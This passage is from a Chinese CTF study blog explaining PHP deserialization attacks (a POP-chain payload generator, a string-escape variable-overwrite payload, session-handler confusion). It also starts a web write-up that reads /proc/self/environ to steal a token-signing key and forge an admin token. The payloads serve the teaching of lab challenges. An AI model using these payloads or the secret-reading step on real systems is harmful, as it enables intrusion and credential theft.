class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">[写在前面]</span><br><span class="line">反序列化可以参考</span><br><span class="line">https:<span class="comment">//zhuanlan.zhihu.com/p/102166928</span></span><br><span class="line">解答中可能会出现<span class="string">&quot;类&quot;</span>和<span class="string">&quot;实例&quot;</span>这两个词组的混合使用,</span><br><span class="line">需要注意对于魔术方法来说,<span class="string">&quot;类&quot;</span>和<span class="string">&quot;实例&quot;</span>均能够触发</span><br><span class="line">只是由于出题人表达习惯,所以解答中可能一会说<span class="string">&quot;类&quot;</span>一会说<span class="string">&quot;实例&quot;</span></span><br><span class="line">类只是一个定义好的框架,实例就是其照着框架生成的变量,</span><br><span class="line">在魔术方法的触发上并不会有区别</span><br><span class="line"></span><br><span class="line">pop</span><br><span class="line"></span><br><span class="line">[介绍]</span><br><span class="line">简单的反序列化链,弄清魔术方法之间如何套接就好了,魔法函数可以参考</span><br><span class="line">https:<span class="comment">//blog.csdn.net/inqihoo/article/details/9235103</span></span><br><span class="line">魔术方法实际上就是PHP类中内置的一些特殊方法</span><br><span class="line">这些方法会在特定的条件下被自动触发</span><br><span class="line">[解答]</span><br><span class="line">反序列化的解答实际上就是理清反序列化的链(POP链)是如何一步步实现的,</span><br><span class="line">payload由附录中的PHP脚本生成</span><br><span class="line">(建议对着PHP脚本中对应的类的构造来看解答)</span><br><span class="line">先找反序列化的入口,本题中的入口是</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">再找下最终要实现的代码,在Makima类中的</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;万圣节!万圣节!万圣节!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">所以我们要构造一个POP链从入口开始触发魔术方法直到最终到Makima类中的__invoke魔术方法获取到flag</span><br><span class="line">先来看看入口处能触发哪个魔术方法</span><br><span class="line">__destruct</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);讲传入的参数pop的值转化为对应的类</span><br><span class="line">这个过程在本题中并不能触发其他魔术方法</span><br><span class="line">但是请注意魔术方法__destruct</span><br><span class="line">这个魔术方法会在一个类对应的实例销毁时自动触发</span><br><span class="line">在PHP中脚本执行完成时所有变量(对应的数据)会被销毁,在一个数据没有被变量引用时也会被销毁</span><br><span class="line">本题中unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);虽然执行了反序列化获得了一个类</span><br><span class="line">但这个类并没有被赋值为任意一个变量,所以在反序列化完成后,这个反序列化得到的类被销毁了</span><br><span class="line">所以令反序列化得到的类为ChainSawMan,便能触发它的__destruct魔术方法</span><br><span class="line">执行其中的代码</span><br><span class="line"><span class="keyword">echo</span>(<span class="keyword">$this</span>-&gt;toolMan);</span><br><span class="line">__toString</span><br><span class="line">最终目的是执行到Makima类中的__invoke魔术方法,显然到上面还不够</span><br><span class="line">我们需要接着构造下去,</span><br><span class="line">我们的代码已经构造到了<span class="keyword">echo</span>(<span class="keyword">$this</span>-&gt;toolMan);</span><br><span class="line">而__toString会在一个类被当作字符串使用时触发</span><br><span class="line">如果让<span class="keyword">$this</span>-&gt;toolMan的值为定义了__toString魔术方法的Reze类即可触发</span><br><span class="line">我们便可以执行其中的代码</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;girl===<span class="string">&quot;dead&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor;</span><br><span class="line">此处先指明,为了进一步构造下去<span class="keyword">$this</span>-&gt;toolMan赋值的Reze类,</span><br><span class="line">其中的<span class="keyword">$this</span>-&gt;girl其值必须为<span class="string">&quot;dead&quot;</span>来执行</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart;这行代码</span><br><span class="line">__get</span><br><span class="line">运行上述代码是为了能触发Power类中的__get魔术方法</span><br><span class="line">将<span class="keyword">$this</span>-&gt;ChasingFor赋值为Power类的一个实例,这样</span><br><span class="line"><span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart实际上是Power类中的heart属性</span><br><span class="line">但是明显Power类不存在heart属性,这样便能触发__get魔术方法,</span><br><span class="line">执行<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;BirthdayCake)();</span><br><span class="line">__invoke</span><br><span class="line">魔术方法__invoke是在类被当作函数调用时触发</span><br><span class="line">如果让上面<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;BirthdayCake)();此处的<span class="keyword">$this</span>-&gt;BirthdayCake赋值为Makima类的实例</span><br><span class="line">这样就相当于去以函数的方式取调用Makima类,</span><br><span class="line">这样就能执行Makima类中的__invoke魔术方法中的代码</span><br><span class="line">也就能获得flag了</span><br><span class="line">[flag]</span><br><span class="line">flag&#123;f1r2_PuNch_t0_mAkIma&#125;</span><br><span class="line"></span><br><span class="line">[附录]</span><br><span class="line">[pop的payload文件]</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChainSawMan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$toolMan</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;toolMan=<span class="keyword">new</span> Reze();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Makima</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$demon</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;demon=<span class="string">&quot;MeatFeast&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Power</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$BirthdayCake</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;BirthdayCake=<span class="keyword">new</span> Makima();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;BirthdayCake();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reze</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ChasingFor</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;girl=<span class="string">&quot;dead&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ChasingFor=<span class="keyword">new</span> Power();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;girl===<span class="string">&quot;dead&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor-&gt;heart;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ChasingFor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ChainSawMan();</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="反序列化变量覆盖："><a href="#反序列化变量覆盖：" class="headerlink" title="反序列化变量覆盖："></a>反序列化变量覆盖：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//注意这里实际上实例化了两个extract类</span></span><br><span class="line"><span class="comment">//所以最终脚本结束销毁变量时会触发两次__dextruct</span></span><br><span class="line"><span class="comment">//如果payload正确你只会看到一句try again而不是两句</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">extract</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var=<span class="variable">$arg</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=<span class="string">&quot;this_is_not_a_secret&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key===<span class="string">&quot;this_is_a_secret&quot;</span>)</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;try again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cls</span>=<span class="keyword">new</span> extract(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line"><span class="variable">$serializeStr</span>=str_replace(<span class="string">&#x27;wot&#x27;</span>,<span class="string">&#x27;what&#x27;</span>,serialize(<span class="variable">$cls</span>));</span><br><span class="line"><span class="variable">$newcls</span>=unserialize(<span class="variable">$serializeStr</span>);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="keyword">try</span> againtry again</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">考的是序列化里面的变量覆盖</span><br><span class="line">序列化实际上是按照一定规则把类里面的变量保存成字符串</span><br><span class="line">反序列化则是按照这个规则反向从字符串中解析出变量</span><br><span class="line">但问题在于反序列化只是一种单纯的数据类型转换方式,</span><br><span class="line">转换的结果完全在于反序列化的字符串里面的字符内容</span><br><span class="line">所以我们完全可以按照序列化的规则自己构造出包含任意值字符串对正常序列化后的字符串拼接,替换</span><br><span class="line">(这套规则可以参考https://www.cnblogs.com/webu/archive/2013/01/28/2879383.html)</span><br><span class="line">反序列时仍然能够正常解析为我们涉及的值,如</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line"><span class="variable">$test</span>=<span class="string">&quot;hi&quot;</span>;&#125;</span><br><span class="line">序列化的结果是字符串</span><br><span class="line">O:4:<span class="string">&quot;test&quot;</span>:1:&#123;s:4:<span class="string">&quot;test&quot;</span>;s:2:<span class="string">&quot;hi&quot;</span>;&#125;</span><br><span class="line">按照序列化的规则我们完全新增一个值为字符串<span class="string">&quot;123&quot;</span>的变量a,只需要对上述字符串进行小小的修改,如</span><br><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;s:4:<span class="string">&quot;test&quot;</span>;s:2:<span class="string">&quot;hi&quot;</span>;s:1:<span class="string">&quot;a&quot;</span>;s:3:<span class="string">&quot;123&quot;</span>;&#125;</span><br><span class="line">反序列后得到的类也就对应多了一个值为字符串<span class="string">&quot;123&quot;</span>的变量a</span><br><span class="line">本题的考点实际上也就是类似于这种操作</span><br><span class="line">人为的修改序列化后得的字符串,使得extract类中的key属性值发生变化</span><br><span class="line">具体操作在解答部分中解释</span><br><span class="line">[解答]</span><br><span class="line">先给出payload</span><br><span class="line">?value=wotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwotwot<span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:16:&quot;</span>this_is_a_secret<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">本题和介绍中描述情况的差别是,我们输入的所有内容只会赋值为extract类的arg属性的值</span></span><br><span class="line"><span class="string">我们并不存在对extract类序列化,或者反序列化结果的直接掌控</span></span><br><span class="line"><span class="string">可控点在于str_replace(&#x27;wot&#x27;,&#x27;what&#x27;,serialize(<span class="variable">$cls</span>))此处代码</span></span><br><span class="line"><span class="string">将序列化后字符串中的所有wot替换为what</span></span><br><span class="line"><span class="string">需要注意的是,序列化时已经按照规则固定好了各部分的长度和内容</span></span><br><span class="line"><span class="string">像这样强行替换值可能会导致错误(也就是本题的利用点),以介绍中的test类为例</span></span><br><span class="line"><span class="string">假设正常序列化结果为</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:3:&quot;</span>wot<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">经过替换变成了</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:3:&quot;</span>what<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">反序列化时按照规则s:2:&quot;</span>what<span class="string">&quot;;这一段前面的s:2实际上规定了</span></span><br><span class="line"><span class="string">后面数值为字符型,长度为3,但替换后变成what,明显长度为4,前后矛盾,这个时候就会解析失败</span></span><br><span class="line"><span class="string">但如果将test类的test属性的值改变一下呢?如</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:12:&quot;</span>wotwotwot<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">这时的<span class="built_in">test</span>属性的值为一个长度为12的字符串wotwotwot<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">接着进行了替换变成了</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:12:&quot;</span>whatwhatwhat<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">可以发现,替换后wotwotwot变成了whatwhatwhat,仔细数一数会发现</span><br><span class="line">whatwhatwhat的长度就已经为12,</span><br><span class="line">这时再按照反序列化规则来解析,<span class="built_in">test</span>类的<span class="built_in">test</span>变量的值就为whatwhatwhat,</span><br><span class="line">原本的wotwotwot<span class="string">&quot;;&#125;由于wot=&gt;what这种格式的替换</span></span><br><span class="line"><span class="string">整体长度整整多了3,这就导致了反序列化解析式时获取的test属性的值少了最后&quot;</span>;&#125;这三个字符</span><br><span class="line">而这三个符号<span class="string">&quot;;&#125;刚好又是特殊符号与前面的部分形成了闭合保证了能够被正常解析,</span></span><br><span class="line"><span class="string">此时我们可以把这个替换后的结构分开来看一看</span></span><br><span class="line"><span class="string">O:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;:1:&#123;s:4:&quot;</span><span class="built_in">test</span><span class="string">&quot;;s:12:&quot;</span>whatwhatwhat<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">很显然,前面部分就按照解析规则已经可以被正常的解析为一个类了,PHP解析到此也就停止</span><br><span class="line">后面部分的<span class="string">&quot;;&#125;省去</span></span><br><span class="line"><span class="string">回到本题上来,也是同样的方法</span></span><br><span class="line"><span class="string">我们先列出来,如果extract类中的key属性值为所需值时序列化结果(假设传入令var值为a)</span></span><br><span class="line"><span class="string">O:7:&quot;</span>extract<span class="string">&quot;:2:&#123;s:3:&quot;</span>var<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:16:&quot;</span>this_is_a_secret<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">但实际题目中我们获得的序列化结果是</span></span><br><span class="line"><span class="string">O:7:&quot;</span>extract<span class="string">&quot;:2:&#123;s:3:&quot;</span>var<span class="string">&quot;;s:1:&quot;</span>a<span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:20:&quot;</span>this_is_not_a_secret<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">按照上述同理,我们可以让var属性的值以&quot;</span>;s:3:<span class="string">&quot;key&quot;</span>;s:16:<span class="string">&quot;this_is_a_secret&quot;</span>;&#125;这部分结尾(这部分37个字符)</span><br><span class="line">以一定数量的(37个)wot开头,这样由于随后的wot=&gt;what替换</span><br><span class="line">结尾的部分便被<span class="string">&quot;挤出去&quot;</span>了,随后按照反序列化规则的解析,</span><br><span class="line">反序列化结果中key属性值便是this_is_a_secret也就拿到flag了</span><br><span class="line">[flag]</span><br><span class="line">flag&#123;ez_Var1abl2_c0verAg2&#125;</span><br></pre></td></tr></table></figure><h4 id="session反序列化攻击："><a href="#session反序列化攻击：" class="headerlink" title="session反序列化攻击："></a>session反序列化攻击：</h4><h5 id="先来了解一下什么是session"><a href="#先来了解一下什么是session" class="headerlink" title="先来了解一下什么是session:"></a>先来了解一下什么是session:</h5><p>在计算机中，尤其是在网络应用中，称为“会话控制”。<strong>Session 对象存储特定用户会话所需的属性及配置信息。</strong>这样，<strong>当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。</strong>当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p><h5 id="session是如何起作用的："><a href="#session是如何起作用的：" class="headerlink" title="session是如何起作用的："></a>session是如何起作用的：</h5><p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p><h5 id="session-start函数的作用："><a href="#session-start函数的作用：" class="headerlink" title="session_start函数的作用："></a>session_start函数的作用：</h5><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， <strong>PHP 会自动反序列化session文件的内容</strong>，<strong>并将之填充到 $_SESSION 超级全局变量中</strong>。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。<strong>如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</strong></p><h5 id="想要知道为什么为出现这个session漏洞，就需要了解session机制中对序列化是如何处理的："><a href="#想要知道为什么为出现这个session漏洞，就需要了解session机制中对序列化是如何处理的：" class="headerlink" title="想要知道为什么为出现这个session漏洞，就需要了解session机制中对序列化是如何处理的："></a>想要知道为什么为出现这个session漏洞，就需要了解session机制中对序列化是如何处理的：</h5><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211015214433147.png" alt="image-20211015214433147"></p><p>这个便是在相应的处理器处理下，<code>session</code>所存储的格式，这里举个例子来了解一下在不同的处理器下，session所储存的格式有什么不一样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span></span><br><span class="line"><span class="comment">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;lemon&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出为：</span></span><br><span class="line">php : lemon|s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;</span><br><span class="line">php_serialize : a:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;lemon&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;&#125;</span><br><span class="line">php_binary : lemons:<span class="number">3</span>:<span class="string">&quot;shy&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>其实PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。如：使用不同引擎来处理session文件。</strong></p><h5 id="使用不同的引擎来处理session文件-session反序列化漏洞）"><a href="#使用不同的引擎来处理session文件-session反序列化漏洞）" class="headerlink" title="使用不同的引擎来处理session文件(session反序列化漏洞）:"></a>使用不同的引擎来处理session文件(session反序列化漏洞）:</h5><p>php引擎的存储格式是<code>键名 | serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>。<strong>如果程序使用两个引擎来分别处理的话就会出现问题。</strong></p><p><strong>(1.php)</strong></p><p>先以<code>php_serialize</code>的格式存储，从客户端接收参数并存入<code>session</code>变量</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211015214940789.png" alt="image-20211015214940789"></p><p><strong>(2.php)</strong></p><p>接下来使用<code>php</code>引擎读取session文件</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211015215007817.png" alt="image-20211015215007817"></p><h4 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h4><p>首先访问1.php，<strong>在传入的参数最开始加一个’|’<strong>，由于</strong>1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。</strong>然后访问2.php，由于用的是<strong>php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;序列化与反序列化&lt;/h2&gt;&lt;h4 id=&quot;序列化函数：serialize：&quot;&gt;&lt;a href=&quot;#序列化函数：seriali</summary>
      
    
    
    
    <category term="Study" scheme="http://example.com/categories/Study/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CNSS-Recruit—2021—web_wp</title>
    <link href="http://example.com/2021/11/17/CNSS-Recruit%E2%80%942021%E2%80%94web-wp/"/>
    <id>http://example.com/2021/11/17/CNSS-Recruit%E2%80%942021%E2%80%94web-wp/</id>
    <published>2021-11-17T07:26:12.000Z</published>
    <updated>2021-11-17T07:31:33.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CNSS-Recruit-2021——web-wp"><a href="#CNSS-Recruit-2021——web-wp" class="headerlink" title="CNSS Recruit 2021——web_wp"></a>CNSS Recruit 2021——web_wp</h1><h2 id="1-To-be-admin"><a href="#1-To-be-admin" class="headerlink" title="1.To_be_admin"></a>1.To_be_admin</h2><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008200128093.png" alt="image-20211008200128093"></p><p>观察到最下面一行的提示，那就是先要读取一些文件。</p><p>因为从题目知可能要伪造admin身份,就查看一下token，解码后发现username为guest，那就改为admin，重新传进去token并发送，但是报错。</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008200521598.png" alt="image-20211008200521598"></p><p>所以可能还需要密钥验证，那就可能在我们要读的file中，所以读取环境变量，那就构造payload:/read?<strong>file=/proc/self/environ,尝试读取网页的环境变量</strong>，发现正有我们要找的key。</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008201324238.png" alt="image-20211008201324238"></p><p>将参数传进去在添加密钥，就能得到修改后的token了，在传进网页就可以获取flag了。</p><p><img src="C:\Users\SMY\AppData\Roaming\Typora\typora-user-images\image-20211008201130684.png" alt="image-20211008201130684"></p><h2 id="2-To-be-admin-again"><a href="#2-To-be-admin-again" class="headerlink" title="2.To_be_admin_again"></a>2.To_be_admin_again</h2><p>访问题目地址发现是一段PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 